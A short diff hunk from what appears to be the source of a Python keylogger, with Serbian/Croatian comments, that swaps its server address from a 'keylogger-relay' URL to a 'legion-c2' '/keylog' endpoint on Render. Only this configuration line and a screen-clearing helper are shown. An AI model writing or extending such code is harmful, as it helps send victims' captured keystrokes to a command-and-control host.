@@ -6,7 +6,7 @@ import os
 import sys
 
 # 🔁 URL TVOG SERVERA NA RENDERU!
-SERVER_LOGS_URL = "https://keylogger-relay-1.onrender.com/logs"
+SERVER_URL = "https://legion-c2.onrender.com/keylog"
 
 def clear_screen():
     """Briše ekran"""
